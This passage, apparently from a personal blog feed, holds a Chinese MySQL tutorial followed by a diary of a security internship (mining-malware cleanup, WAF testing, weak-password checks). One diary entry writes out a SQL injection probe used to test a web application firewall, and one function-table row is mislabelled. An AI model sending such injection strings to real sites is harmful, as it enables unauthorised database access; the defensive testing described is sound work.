<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT 字段列表 FROM 表名 LIMIT 起始索引, 查询记录数 ;</span><br></pre></td></tr></table></figure>

<p>A. 查询第1页员工数据, 每页展示10条记录</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from emp limit 0,10;</span><br><span class="line">select * from emp limit 10;</span><br></pre></td></tr></table></figure>

<p>B. 查询第2页员工数据, 每页展示10条记录 </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from emp limit 10,10;</span><br></pre></td></tr></table></figure>

<h3 id="案例-1"><a href="#案例-1" class="headerlink" title="案例"></a>案例</h3><p>1). 查询年龄为20,21,22,23岁的女员工信息。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from emp where gender = &#x27;女&#x27; and age in(20,21,22,23);</span><br></pre></td></tr></table></figure>

<p>2). 查询性别为 男 ，并且年龄在 20-40 岁(含)以内的姓名为三个字的员工。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from emp where gender = &#x27;男&#x27; and ( age between 20 and 40 ) and name like</span><br><span class="line">&#x27;___&#x27;;</span><br></pre></td></tr></table></figure>

<p>3). 统计员工表中, 年龄小于60岁的 , 男性员工和女性员工的人数。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select gender, count(*) from emp where age &lt; 60 group by gender;</span><br></pre></td></tr></table></figure>

<p>4). 查询所有年龄小于等于35岁员工的姓名和年龄，并对查询结果按年龄升序排序，如果年龄相同按 入职时间降序排序。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select name , age from emp where age &lt;= 35 order by age asc , entrydate desc;</span><br></pre></td></tr></table></figure>

<p>5). 查询性别为男，且年龄在20-40 岁(含)以内的前5个员工信息，对查询的结果按年龄升序排序， 年龄相同按入职时间升序排序。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from emp where gender = &#x27;男&#x27; and age between 20 and 40 order by age asc ,</span><br><span class="line">entrydate asc limit 5 ;</span><br></pre></td></tr></table></figure>

<h3 id="执行顺序"><a href="#执行顺序" class="headerlink" title="执行顺序"></a>执行顺序</h3><p>DQL执行顺序</p>
<p><img src="https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230309085943559.png" alt="image-20230309085943559"></p>
<p>验证：</p>
<p>查询年龄大于15的员工姓名、年龄，并根据年龄进行升序排序。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select name , age from emp where age &gt; 15 order by age asc;</span><br></pre></td></tr></table></figure>

<p>在查询时，我们给emp表起一个别名 e，然后在select 及 where中使用该别名。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select e.name , e.age from emp e where e.age &gt; 15 order by age asc;</span><br></pre></td></tr></table></figure>

<p>可以正常的查询到结果,此时就说明： from 先执行, 然后 where 和 select 执行。</p>
<p>那 where 和 select 到底哪个先执行呢? </p>
<p>此时，此时我们可以给select后面的字段起别名，然后在 where 中使用这个别名，然后看看是否可 以执行成功。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select e.name ename , e.age eage from emp e where eage &gt; 15 order by age asc;</span><br></pre></td></tr></table></figure>

<p>SQL报错了,可以得出结论: from 先执行，然后执行 where ， 再执行select 。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select e.name ename , e.age eage from emp e where e.age &gt; 15 order by eage asc;</span><br></pre></td></tr></table></figure>

<p>成功,就验证了: order by 是在select 语句之后执行的。</p>
<p><strong>综上所述，我们可以看到DQL语句的执行顺序为： from … where … group by … having … select … order by … limit …</strong></p>
<h2 id="DCL"><a href="#DCL" class="headerlink" title="DCL"></a>DCL</h2><p>DCL英文全称是Data Control Language(数据控制语言)，用来管理数据库用户、控制数据库的访 问权限。</p>
<h3 id="管理用户"><a href="#管理用户" class="headerlink" title="管理用户"></a>管理用户</h3><p>1). 查询用户</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from mysql.user;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230309090928741.png" alt="image-20230309090928741"></p>
<p>其中 Host代表当前用户访问的主机, 如果为localhost, 仅代表只能够在当前本机访问，是不可以 远程访问的。 User代表的是访问该数据库的用户名。在MySQL中需要通过Host和User来唯一标识一 个用户。</p>
<p>2). 创建用户</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CREATE USER &#x27;用户名&#x27;@&#x27;主机名&#x27; IDENTIFIED BY &#x27;密码&#x27;;</span><br></pre></td></tr></table></figure>

<p>3). 修改用户密码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ALTER USER &#x27;用户名&#x27;@&#x27;主机名&#x27; IDENTIFIED WITH mysql_native_password BY &#x27;新密码&#x27; ;</span><br></pre></td></tr></table></figure>

<p>4). 删除用户</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DROP USER &#x27;用户名&#x27;@&#x27;主机名&#x27; ;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">注意事项:</span><br><span class="line">• 在MySQL中需要通过用户名@主机名的方式，来唯一标识一个用户。</span><br><span class="line">• 主机名可以使用 % 通配。</span><br><span class="line">• 这类SQL开发人员操作的比较少，主要是DBA（ Database Administrator 数据库管理员）使用。</span><br></pre></td></tr></table></figure>

<p>案例：</p>
<p>A. 创建用户itcast, 只能够在当前主机localhost访问, 密码123456;</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">create user &#x27;itcast&#x27;@&#x27;localhost&#x27; identified by &#x27;123456&#x27;;</span><br></pre></td></tr></table></figure>

<p>B. 创建用户heima, 可以在任意主机访问该数据库, 密码123456;</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">create user &#x27;heima&#x27;@&#x27;%&#x27; identified by &#x27;123456&#x27;;</span><br></pre></td></tr></table></figure>

<p>C. 修改用户heima的访问密码为1234;</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">alter user &#x27;heima&#x27;@&#x27;%&#x27; identified with mysql_native_password by &#x27;1234&#x27;;</span><br></pre></td></tr></table></figure>

<p>D. 删除 itcast@localhost 用户</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">drop user &#x27;itcast&#x27;@&#x27;localhost&#x27;;</span><br></pre></td></tr></table></figure>

<h3 id="权限控制"><a href="#权限控制" class="headerlink" title="权限控制"></a>权限控制</h3><p>MySQL中定义了很多种权限,<a href="https://dev.mysql.com/doc/refman/8.0/en/privileges-provided.html">MySQL :: MySQL 8.0 Reference Manual :: 6.2.2 Privileges Provided by MySQL</a></p>
<p><img src="https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230309092308658.png" alt="image-20230309092308658"></p>
<p>1). 查询权限</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SHOW GRANTS FOR &#x27;用户名&#x27;@&#x27;主机名&#x27; ;</span><br></pre></td></tr></table></figure>

<p>2). 授予权限</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GRANT 权限列表 ON 数据库名.表名 TO &#x27;用户名&#x27;@&#x27;主机名&#x27;;</span><br></pre></td></tr></table></figure>

<p>3). 撤销权限</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">REVOKE 权限列表 ON 数据库名.表名 FROM &#x27;用户名&#x27;@&#x27;主机名&#x27;;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">注意事项：</span><br><span class="line">• 多个权限之间，使用逗号分隔</span><br><span class="line">• 授权时， 数据库名和表名可以使用 * 进行通配，代表所有。</span><br></pre></td></tr></table></figure>

<p>案例:</p>
<p>A. 查询 ‘heima‘@’%’ 用户的权限</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">show grants for &#x27;heima&#x27;@&#x27;%&#x27;;</span><br></pre></td></tr></table></figure>

<p>B. 授予 ‘heima‘@’%’ 用户itcast数据库所有表的所有操作权限</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">grant all on itcast.* to &#x27;heima&#x27;@&#x27;%&#x27;;</span><br></pre></td></tr></table></figure>

<p>C. 撤销 ‘heima‘@’%’ 用户的itcast数据库的所有权限</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">revoke all on itcast.* from &#x27;heima&#x27;@&#x27;%&#x27;;</span><br></pre></td></tr></table></figure>

<h1 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h1><p>函数 是指一段可以直接被另一段程序调用的程序或代码。</p>
<p>问题：</p>
<p>1). 在企业的OA或其他的人力系统中，经常会提供的有这样一个功能，每一个员工登录上来之后都能 够看到当前员工入职的天数。 而在数据库中，存储的都是入职日期，如 2000-11-12，那如果快速计 算出天数呢？</p>
<p> 2). 在做报表这类的业务需求中,我们要展示出学员的分数等级分布。而在数据库中，存储的是学生的 分数值，如98&#x2F;75，如何快速判定分数的等级呢？ </p>
<p>其实，上述的这一类的需求呢，我们通过MySQL中的函数都可以很方便的实现 。 MySQL中的函数主要分为以下四类： 字符串函数、数值函数、日期函数、流程函数。</p>
<h3 id="字符串函数"><a href="#字符串函数" class="headerlink" title="字符串函数"></a>字符串函数</h3><table>
<thead>
<tr>
<th align="center">函数</th>
<th align="center">功能</th>
</tr>
</thead>
<tbody><tr>
<td align="center">CONCAT(S1,S2,…Sn)</td>
<td align="center">字符串拼接，将S1，S2，… Sn拼接成一个字符串</td>
</tr>
<tr>
<td align="center">LOWER(str)</td>
<td align="center">将字符串str全部转为小写</td>
</tr>
<tr>
<td align="center">UPPER(str)</td>
<td align="center">将字符串str全部转为大写</td>
</tr>
<tr>
<td align="center">LPAD(str,n,pad)</td>
<td align="center">左填充，用字符串pad对str的左边进行填充，达到n个字符 串长度</td>
</tr>
<tr>
<td align="center">RPAD(str,n,pad)</td>
<td align="center">右填充，用字符串pad对str的右边进行填充，达到n个字符 串长度</td>
</tr>
<tr>
<td align="center">TRIM(str)</td>
<td align="center">去掉字符串头部和尾部的空格</td>
</tr>
<tr>
<td align="center">SUBSTRING(str,start,len)</td>
<td align="center">返回从字符串str从start位置起的len个长度的字符串</td>
</tr>
</tbody></table>
<p>由于业务需求变更，企业员工的工号，统一为5位数，目前不足5位数的全部在前面补0。比如： 1号员 工的工号应该为00001。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">update emp set workno = lpad(workno, 5, &#x27;0&#x27;);</span><br></pre></td></tr></table></figure>

<h3 id="数值函数"><a href="#数值函数" class="headerlink" title="数值函数"></a>数值函数</h3><p>常见的数值函数如下：</p>
<table>
<thead>
<tr>
<th align="center">函数</th>
<th align="center">功能</th>
</tr>
</thead>
<tbody><tr>
<td align="center">CEIL(x)</td>
<td align="center">向上取整</td>
</tr>
<tr>
<td align="center">向上取整</td>
<td align="center">向下取整</td>
</tr>
<tr>
<td align="center">MOD(x,y)</td>
<td align="center">返回x&#x2F;y的模</td>
</tr>
<tr>
<td align="center">RAND()</td>
<td align="center">返回0~1内的随机数</td>
</tr>
<tr>
<td align="center">ROUND(x,y)</td>
<td align="center">求参数x的四舍五入的值，保留y位小数</td>
</tr>
</tbody></table>
<p>例子：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-- 数值函数</span><br><span class="line">-- ceil</span><br><span class="line">select ceil(1.1);</span><br><span class="line"></span><br><span class="line">-- floor</span><br><span class="line">select floor(1.9);</span><br><span class="line"></span><br><span class="line">-- mod</span><br><span class="line">select mod(7,4);</span><br><span class="line"></span><br><span class="line">-- rand</span><br><span class="line">select rand();</span><br><span class="line"></span><br><span class="line">-- round</span><br><span class="line">select round(2.344,2);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-- 案例: 通过数据库的函数，生成一个六位数的随机验证码。</span><br><span class="line">select lpad(round(rand()*1000000 , 0), 6, &#x27;0&#x27;);</span><br></pre></td></tr></table></figure>

<h3 id="日期函数"><a href="#日期函数" class="headerlink" title="日期函数"></a>日期函数</h3><p>常见的日期函数如下：</p>
<table>
<thead>
<tr>
<th align="center">函数</th>
<th align="center">功能</th>
</tr>
</thead>
<tbody><tr>
<td align="center">CURDATE()</td>
<td align="center">返回当前日期</td>
</tr>
<tr>
<td align="center">CURTIME()</td>
<td align="center">返回当前时间</td>
</tr>
<tr>
<td align="center">NOW()</td>
<td align="center">返回当前日期和时间</td>
</tr>
<tr>
<td align="center">YEAR(date)</td>
<td align="center">获取指定date的年份</td>
</tr>
<tr>
<td align="center">MONTH(date)</td>
<td align="center">获取指定date的月份</td>
</tr>
<tr>
<td align="center">DAY(date)</td>
<td align="center">获取指定date的日期</td>
</tr>
<tr>
<td align="center">DATE_ADD(date, INTERVAL expr type)</td>
<td align="center">返回一个日期&#x2F;时间值加上一个时间间隔expr后的时间值</td>
</tr>
<tr>
<td align="center">DATEDIFF(date1,date2)</td>
<td align="center">返回起始时间date1 和 结束时间date2之间的天数</td>
</tr>
</tbody></table>
<p>实例：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-- 案例: 查询所有员工的入职天数，并根据入职天数倒序排序。</span><br><span class="line">select name, datediff(curdate(), entrydate) as &#x27;entrydays&#x27; from emp order by entrydays desc;</span><br></pre></td></tr></table></figure>

<h3 id="流程函数"><a href="#流程函数" class="headerlink" title="流程函数"></a>流程函数</h3><table>
<thead>
<tr>
<th align="center">函数</th>
<th align="center">功能</th>
</tr>
</thead>
<tbody><tr>
<td align="center">IF(value, t, f)</td>
<td align="center">如果value为true，则返回t，否则返回f</td>
</tr>
<tr>
<td align="center">IFNULL(value1, value2)</td>
<td align="center">如果value1不为空，返回value1，否则返回value2</td>
</tr>
<tr>
<td align="center">CASE WHEN [val1] THEN [res1] … ELSE [default] END</td>
<td align="center">如果val1为true，返回res1，… 否则返回default默认值</td>
</tr>
<tr>
<td align="center">CASE [expr] WHEN [val1] THEN [res1] … ELSE [default] END</td>
<td align="center">如果expr的值等于val1，返回res1，… 否则返回default默认值</td>
</tr>
</tbody></table>
<p>实例：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-- 流程控制函数</span><br><span class="line">-- if</span><br><span class="line">select if(false, &#x27;Ok&#x27;, &#x27;Error&#x27;);</span><br><span class="line"></span><br><span class="line">-- ifnull</span><br><span class="line">select ifnull(&#x27;Ok&#x27;,&#x27;Default&#x27;);</span><br><span class="line"></span><br><span class="line">select ifnull(&#x27;&#x27;,&#x27;Default&#x27;);</span><br><span class="line"></span><br><span class="line">select ifnull(null,&#x27;Default&#x27;);</span><br><span class="line"></span><br><span class="line">-- case when then else end</span><br><span class="line">-- 需求: 查询emp表的员工姓名和工作地址 (北京/上海 ----&gt; 一线城市 , 其他 ----&gt; 二线城市)</span><br><span class="line">select</span><br><span class="line">    name,</span><br><span class="line">    ( case workaddress when &#x27;北京&#x27; then &#x27;一线城市&#x27; when &#x27;上海&#x27; then &#x27;一线城市&#x27; else &#x27;二线城市&#x27; end ) as &#x27;工作地址&#x27;</span><br><span class="line">from emp;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-- 案例: 统计班级各个学员的成绩，展示的规则如下：</span><br><span class="line">-- &gt;= 85，展示优秀</span><br><span class="line">-- &gt;= 60，展示及格</span><br><span class="line">-- 否则，展示不及格</span><br><span class="line"></span><br><span class="line">create table score(</span><br><span class="line">    id int comment &#x27;ID&#x27;,</span><br><span class="line">    name varchar(20) comment &#x27;姓名&#x27;,</span><br><span class="line">    math int comment &#x27;数学&#x27;,</span><br><span class="line">    english int comment &#x27;英语&#x27;,</span><br><span class="line">    chinese int comment &#x27;语文&#x27;</span><br><span class="line">) comment &#x27;学员成绩表&#x27;;</span><br><span class="line">insert into score(id, name, math, english, chinese) VALUES (1, &#x27;Tom&#x27;, 67, 88, 95 ), (2, &#x27;Rose&#x27; , 23, 66, 90),(3, &#x27;Jack&#x27;, 56, 98, 76);</span><br><span class="line"></span><br><span class="line">--</span><br><span class="line">select</span><br><span class="line">    id,</span><br><span class="line">    name,</span><br><span class="line">    (case when math &gt;= 85 then &#x27;优秀&#x27; when math &gt;=60 then &#x27;及格&#x27; else &#x27;不及格&#x27; end ) &#x27;数学&#x27;,</span><br><span class="line">    (case when english &gt;= 85 then &#x27;优秀&#x27; when english &gt;=60 then &#x27;及格&#x27; else &#x27;不及格&#x27; end ) &#x27;英语&#x27;,</span><br><span class="line">    (case when chinese &gt;= 85 then &#x27;优秀&#x27; when chinese &gt;=60 then &#x27;及格&#x27; else &#x27;不及格&#x27; end ) &#x27;语文&#x27;</span><br><span class="line">from score;</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>mysql</tag>
      </tags>
  </entry>
  <entry>
    <title>intership of momenta</title>
    <url>/2023/10/18/momenta_intership/</url>
    <content><![CDATA[<p>[toc]</p>
<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>2023-9-29 电子科技大学网安学院拟录取，保研算是结束了。还是挺辛苦的&#x2F;(ㄒoㄒ)&#x2F;~~</p>
<p><img src="https://raw.githubusercontent.com/realikun404/p1cg0_u4e/master/imgimage-20231018213035732.png" alt="image-20231018213035732"></p>
<p>10月份国庆结束，陆陆续续投了下实习。我投的策略是测开、安全都投，因为字节有小米测开实习经历和安恒安服实习经历，所以实习找起来还相对比较顺利。</p>
<p>下面是对应的面试记录：</p>
<p><img src="https://raw.githubusercontent.com/realikun404/p1cg0_u4e/master/imgimage-20231018213250825.png" alt="image-20231018213250825"></p>
<p>值得要吐槽的是快手，在官网上10.03显示面试，但今天10.18号都没有收到任何hr的电话以及导致之前在boss上联系的其它快手测试部门都无法面试我，说必须走完正在面试的流程才能走他们的流程，巨逆天。</p>
<table>
<thead>
<tr>
<th align="center">公司</th>
<th align="center">通过</th>
<th align="center">备注</th>
</tr>
</thead>
<tbody><tr>
<td align="center">蘑菇车帘一面-信息安全</td>
<td align="center">√</td>
<td align="center">电话面巨水且只有一面，三天后hr加微信说约下hr面拒绝了</td>
</tr>
<tr>
<td align="center">字节一面-测开</td>
<td align="center">√</td>
<td align="center">面了一个多小时巨硬核，测试到408到linux、手撕都有，主要有四个手撕：一个sql（没做出来说没怎么学sql）、一个linux命令sed(说遇到敲命令能做)、c++手撕无重复字符的最长子串（以前做过很快写出来）、python手撕无重复字符的最长子串</td>
</tr>
<tr>
<td align="center">momenta一面-信息安全</td>
<td align="center">√</td>
<td align="center">hr打电话之前说准备好编程环境，以为这个很硬，结果并没有手撕代码。大概面了十分钟，主要是自我介绍和收一下自己的实习经历就完了，大概12分钟，以为是kpi面，结果竟然还过来，而且hr说一面面试官免评挺好，震惊了</td>
</tr>
<tr>
<td align="center">滴图-测开</td>
<td align="center">√</td>
<td align="center">加了面试官微信umeet面的，感觉难度适中。主要问了实习经历，以及测试的一些基本问题如怎样测试微信点赞之类。当然也有手撕代码，一道是冒泡排序（很快写出来了，但发现有问题后面debug发现是i–写成i++了）。以及合并有序数组，直接秒了没什么好说的，然后说怎样设置测试用例，只答了正确性测试用例，后面经提醒发现还可以测试性能安全之类的，后面也是过了并且加了ld微信越了二面</td>
</tr>
<tr>
<td align="center">货拉拉-数据安全运营实习生</td>
<td align="center">×</td>
<td align="center">先是常规自我介绍，问实习。之后以为是偏web渗透测试的，结果问了好多数据安全的，比如怎样保障公司内部的数据安全，乱扯什么hash、加密、强密码，估计问题很大。之后到今天（10-18）也没有后续，肯定挂了</td>
</tr>
<tr>
<td align="center">momenta二面-信息安全</td>
<td align="center">√</td>
<td align="center">面试先自我介绍，然后问简历包括实习，edusrc漏洞怎样挖掘的，ssrf、csrf这些比较常规的安全问题。然后后面就偏聊天，问我大学读的什么专业什么研究方向，大概面了20分钟，以为寄了，结果早上面的下午1点左右hr就打电话说过了，后面的也就没面了。挺满意这个的</td>
</tr>
<tr>
<td align="center">趋动科技一面-测开</td>
<td align="center"></td>
<td align="center">拒绝</td>
</tr>
<tr>
<td align="center">纷扬科技-测开</td>
<td align="center"></td>
<td align="center">拒绝</td>
</tr>
<tr>
<td align="center">源堡科技</td>
<td align="center"></td>
<td align="center">拒绝，惊讶的是hr竟然是学姐，聊了会天</td>
</tr>
<tr>
<td align="center">……</td>
<td align="center"></td>
<td align="center">后面的也都拒了</td>
</tr>
</tbody></table>
<h1 id="2023"><a href="#2023" class="headerlink" title="2023"></a>2023</h1><h2 id="10月"><a href="#10月" class="headerlink" title="10月"></a>10月</h2><h3 id="19号"><a href="#19号" class="headerlink" title="19号"></a>19号</h3><p>今天入职，体验还不错，mentor、leader都挺好、感觉很友善。</p>
<p>主要看了文档，对甲方安全有了一些了解包括甲方安全的现状、国家的一些法规、和一些设备。</p>
<p>然后主要看了云端办公的内容，主要是要做客服，应该主要回答解决别人遇到的问题包括vnc输不了密码、磁盘扩容、连接不了等问题。</p>
<h3 id="20号"><a href="#20号" class="headerlink" title="20号"></a>20号</h3><p>主要试了下公司安全设备包括绿盟RSAS（感觉界面挺丑）、奇安信天眼（beng炸弹特性奇怪、然后发现好像有IP遭了挖矿病毒，然后云了下挖矿病毒排查方法包括strace看攻击者替换二进制比如ps的一些preload劫持的dll是什么、或者使用busybox，然后试了下微步情报发现攻击IP确实是恶意IP，问了mentor说最近比较忙之后再看看）、长亭x-ray（感觉跟其它工具差不多）、深信服审计系统（只能说逆天，能看到访问招聘网站就算了连qq给谁发消息都能看到）</p>
<p>收获可能就是摸鱼学了下pwn、和学了挖矿的一些知识比如一些骚知识包括strace、busybox这些东西</p>
<p>附一些挖矿排除链接：</p>
<p><a href="https://ti.qianxin.com/uploads/2021/11/18/f4dd5058aed06883e8cb7fecf3286b1f.pdf">ti.qianxin.com&#x2F;uploads&#x2F;2021&#x2F;11&#x2F;18&#x2F;f4dd5058aed06883e8cb7fecf3286b1f.pdf</a> </p>
<p><a href="https://www.freebuf.com/articles/paper/305589.html">深度解析恶意挖矿攻击：现状、检测及处置手册 - FreeBuf网络安全行业门户</a> </p>
<p><a href="https://www.freebuf.com/articles/web/271281.html">应急响应：记一次花样贼多的挖矿病毒 - FreeBuf网络安全行业门户</a></p>
<h3 id="23日"><a href="#23日" class="headerlink" title="23日"></a>23日</h3><p>主要看了下奇安信的探针和分析平台，导师说了下公司北京和苏州的拓扑情况，明天奇安信的人来培训一下天眼的使用。、</p>
<p>附一些名词，今天初步接触的：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">IDC：https://www.zhihu.com/question/40534161</span><br><span class="line">aws：https://aws.amazon.com/cn/ </span><br><span class="line">VPC：https://info.support.huawei.com/info-finder/encyclopedia/zh/VPC.html</span><br><span class="line">SOC：https://zhuanlan.zhihu.com/p/654413867</span><br><span class="line">SDL：https://zhuanlan.zhihu.com/p/252325178</span><br></pre></td></tr></table></figure>

<p>然后查找poc工具，以及一些编码绕过的poc来对之后的和长亭合作的产品进行合作。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">poc工具</span><br><span class="line">https://github.com/tr0uble-mAker/POC-bomber </span><br><span class="line">感觉还挺好用</span><br></pre></td></tr></table></figure>

<p>以及大佬文章简单看了下，对安全体系有了从0到0.000000000001的深入了解：</p>
<p>poc工具</p>
<p><a href="https://github.com/tr0uble-mAker/POC-bomber">https://github.com/tr0uble-mAker/POC-bomber</a></p>
<p>收获就是对甲方安全或者说是公司安全有了更深的了解，也脱离对安全就是渗透测试的一些浅显认识。</p>
<h3 id="24日"><a href="#24日" class="headerlink" title="24日"></a>24日</h3><p>今天早上跟着导师和长亭的讨论了waf工具的测试包括poc测试、压测、串行测试、并行测试。</p>
<p>进行poc的收集。</p>
<p>然后对甲方安全有了更深的了解，包括其体制建设、其内部的各种安全机制，看大佬文章确实对安全的认识深了很多<a href="https://www.zhihu.com/people/elknot">e1knot - 知乎 (zhihu.com)</a></p>
<p>安全不是仅仅渗透测试，渗透测试仅仅是评估安全的工具。安全更重要的是要企业内部建立起好的安全机制，好好运营。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">IOC：https://blog.csdn.net/xyx112/article/details/130693588#</span><br><span class="line">SIEM：https://www.ibm.com/cn-zh/topics/siem</span><br></pre></td></tr></table></figure>

<h3 id="25日"><a href="#25日" class="headerlink" title="25日"></a>25日</h3><p>请了一天假</p>
<h3 id="26日"><a href="#26日" class="headerlink" title="26日"></a>26日</h3><p>看了长亭测试waf的压测文档，学了其测试思想。学了wrk2控制RPS测试waf看性能的对应内容，输出了压测文档，也让导师看了comment了。</p>
<p>同时也写了了poc测试计划，整理好了表格及标题，到时候直接将测试结果放在表格上即可。</p>
<p>然后其余时间就摸摸鱼看看安全公众号或者安全文档或者看看研究生导师杨老师组网站的对应PPT。</p>
<p>入职也一周了，体验目前很好，感觉人都很nice。</p>
<p>也对WAF的原理有了更深的了解，比如长亭雷池WAF原理就是反向代理，应该熟悉WAF了也能对以后绕WAF能力提升有帮助。</p>
<h3 id="27日"><a href="#27日" class="headerlink" title="27日"></a>27日</h3><p>今天主要进行poc和压测的正式测试。</p>
<p>poc测试就是输入危险payload看能不能检测到，以及输出对应表格。</p>
<p>然后是压测，遇到了一系列问题，长亭雷池先是没配https导致有些问题。后面开始压测发现雷池显示的请求数跟wrk2 RQS对不上而且返回速度很慢，经过排查发现是server服务器性能不太好，处理不了。之后就压测时请求url加了?id&#x3D;1’ union select 1,database()–+这种，这种会被waf拦截，到不了服务器，性能就正常了，就直接拦截不会到服务器，就能正常测试了。</p>
<p>对正向代理、方向代理、waf原理有了更深的理解。</p>
<h3 id="30日"><a href="#30日" class="headerlink" title="30日"></a>30日</h3><p>裂开，被挖矿了，早上10：00忙到晚上12：00</p>
<h3 id="31日"><a href="#31日" class="headerlink" title="31日"></a>31日</h3><p>当客服的一天，也顺便帮忙挖矿排查，又有其它地区被感染了</p>
<p>nnnd，网上看别人排除挖矿多轻松，这里找就巨麻烦，还有两个奇安信的人帮忙都很麻烦</p>
<p>挖矿参考：<a href="https://zhuanlan.zhihu.com/p/108688360">挖矿应急响应小结 - 知乎 (zhihu.com)</a></p>
<h2 id="11月"><a href="#11月" class="headerlink" title="11月"></a>11月</h2><h3 id="01日"><a href="#01日" class="headerlink" title="01日"></a>01日</h3><p>挖矿时间基本结尾，处置了没有及时清理的还有挖矿病毒的机器。学了一下iptables</p>
<h3 id="02日"><a href="#02日" class="headerlink" title="02日"></a>02日</h3><p>云端办公小客服。云端办公进行了最简单的弱口令检查，之后计划加入momenta、passwd、qwerty特征进行弱口令检查以及进行未授权访问排除。</p>
<p>进行了长亭waf压测，awk真好用，学了iptables（没太懂）</p>
<p>进入正常实习生活，之前被挖矿的几天是真的累。</p>
<h3 id="03日"><a href="#03日" class="headerlink" title="03日"></a>03日</h3><p>请了半天假开了组会。</p>
<p>写了个python脚本查中毒机器，并进行处理。看华为云、天眼发现报警，攻击者为外网IP忽略，为内网Ip找人查毒。</p>
<h3 id="06日"><a href="#06日" class="headerlink" title="06日"></a>06日</h3><p><del>发工资了，干劲又多了好多</del></p>
<p>看华为云、奇安信天眼日常看有问题没有，python脚本查毒，三四个有毒。</p>
<p>然后这边甲方安全不只搞安全，还接云端办公充实工作量，调研了（打语音电话）重点部门访谈使用体验和建议。</p>
<p>甲方安全还是爽。</p>
<h3 id="07日"><a href="#07日" class="headerlink" title="07日"></a>07日</h3><p>上午正常干活看华为云、奇安信天眼日常看有问题没有，python脚本查毒，一个有毒。</p>
<p>然后和导师对了下公司弱口令排除的事情，明天在跟另外一个导师对就可以了。</p>
<p>下午几乎刷了一下午的lc sql，还挺爽。现在能够乱杀之前字节实习面试的sql题了（确信（bushi））</p>
<h3 id="08日"><a href="#08日" class="headerlink" title="08日"></a>08日</h3><p>上午正常干活看华为云、奇安信天眼日常看有问题没有，python脚本查毒，无毒。和导师设置了云端办公问卷。</p>
<p>摸鱼刷了会sql，争取这个月把sql五页题水完。（现在已经进入光明正大摸鱼阶段了）</p>
<p>跟长亭沟通了之前的WAF测试计划，也对nginx这些负载均衡有了解，以及负载间https、http这些变化了些数。<a href="https://blog.csdn.net/wufangliang/article/details/103331357">https 下 多级nginx 反向代理设置_x-forwarded-proto $scheme-CSDN博客</a></p>
<h3 id="09日"><a href="#09日" class="headerlink" title="09日"></a>09日</h3><p>上午正常干活看华为云、奇安信天眼日常看有问题没有，python脚本查毒，无毒。华为云发现一个内网爆破，应该是有毒的。以及弱口令找到了个1的密码整治了。发问卷发了50份。</p>
<p>下午办公助手和waf搭建沟通，第二天测试安waf前后差别。然后还是摸鱼刷会sql题。</p>
<h3 id="10号"><a href="#10号" class="headerlink" title="10号"></a>10号</h3><p>请了半天假，日常活。</p>
<h3 id="13、14、15、16、17日"><a href="#13、14、15、16、17日" class="headerlink" title="13、14、15、16、17日"></a>13、14、15、16、17日</h3><p>日常活。</p>
<h3 id="20日"><a href="#20日" class="headerlink" title="20日"></a>20日</h3><p>发现挖矿，top没找到很高的CPU，以为top被劫持了，使用busybox查看还是没有。</p>
<p>直接netstat -antp 找外网连接，发现一个奇怪的发现是病毒。systemctl status pid,看对应信息，然后exe交到微步，看看威胁情报。</p>
<p>后面复盘为什么top不高，发现可能是因为之前封了矿池的dns，病毒下载不到对应东西，所以没有挖矿起来。</p>
<h3 id="21日"><a href="#21日" class="headerlink" title="21日"></a>21日</h3><p>搭建了蜜罐HFISH，感觉还挺好用。</p>
<p>又被挖矿勒，现在会溯源了，知道怎样排查从哪来了，现在是挖矿排查糕手。其它就是些日常活。</p>
